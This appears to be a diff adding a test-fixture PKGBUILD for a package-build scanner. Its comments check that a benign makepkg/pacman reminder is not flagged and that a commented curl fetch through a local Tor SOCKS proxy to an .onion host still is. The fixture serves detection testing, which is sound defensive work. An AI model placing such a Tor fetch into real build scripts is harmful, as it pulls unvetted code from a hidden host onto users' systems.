@@ -1,0 +1,24 @@
+# Maintainer: Someone <someone@example.com>
+pkgname=pkg-commented-out
+pkgver=1.0
+pkgrel=1
+source=("https://example.com/pkg-1.0.tar.gz")
+
+build() {
+    ./configure --prefix=/usr
+    make
+}
+
+package() {
+    make DESTDIR="$pkgdir" install
+}
+
+# A commented-out build reminder — the exact shape that false-positived on
+# the EndeavourOS forum (timeshift's archlinux/PKGBUILD). Pattern 13 must
+# NOT flag this:
+# (cd archlinux; makepkg)
+# sudo pacman -U --noconfirm ./${pkgname}-1.0-1-x86_64.pkg.tar.zst
+
+# ...but the exemption is Pattern 13 only. A commented Tor/onion fetch is
+# never a legitimate note, so this line MUST still be flagged:
+#   curl -x socks5h://127.0.0.1:9050 http://example.onion/x -o "$srcdir/x"
